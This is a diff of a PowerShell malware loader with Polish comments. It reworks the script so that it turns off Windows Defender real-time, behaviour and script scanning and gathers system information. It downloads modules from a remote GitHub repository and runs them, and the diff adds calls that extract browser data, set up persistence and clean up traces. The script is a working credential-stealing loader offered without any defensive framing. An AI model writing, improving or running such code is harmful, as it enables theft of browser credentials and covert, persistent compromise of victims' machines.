@@ -3,7 +3,6 @@ $ErrorActionPreference = 'SilentlyContinue'
 $repoUrl = "https://raw.githubusercontent.com/dfassdaopiju/XzxX/refs/heads/main/"
 $payloadName = "payload.ps1"
 
-#region Mechanizmy Ochronne
 # Funkcja do szyfrowania danych
 function Encrypt-Data {
     param($Data)
@@ -11,15 +10,14 @@ function Encrypt-Data {
     return ConvertFrom-SecureString $secure
 }
 
+#region Mechanizmy Ochronne
+# Tymczasowe wyłączenie Windows Defender
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableBehaviorMonitoring $true
+Set-MpPreference -DisableScriptScanning $true
+
 #region Główna Logika
 try {
-    # Tymczasowe wyłączenie Windows Defender
-    Set-MpPreference -DisableRealtimeMonitoring $true
-    Set-MpPreference -DisableBehaviorMonitoring $true
-    Set-MpPreference -DisableScriptScanning $true
-    Set-MpPreference -DisableIOAVProtection $true
-    Set-MpPreference -DisableArchiveScanning $true
-
     # Tworzenie zabezpieczonego pliku z danymi systemowymi
     $systemData = systeminfo | Out-String
     $encryptedData = Encrypt-Data -Data $systemData
@@ -37,9 +35,14 @@ try {
         [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
         (New-Object Net.WebClient).DownloadFile($moduleUrl, $modulePath)
         
-        # Wykonaj moduł
+        # Wykonaj moduł w obecnym zakresie (funkcje będą dostępne)
         . $modulePath
     }
+    
+    # Wywołanie funkcji z modułów
+    Extract-BrowserData
+    Set-Persistence
+    Invoke-Cleanup
 }
 finally {
     # Przywrócenie ustawień Defender
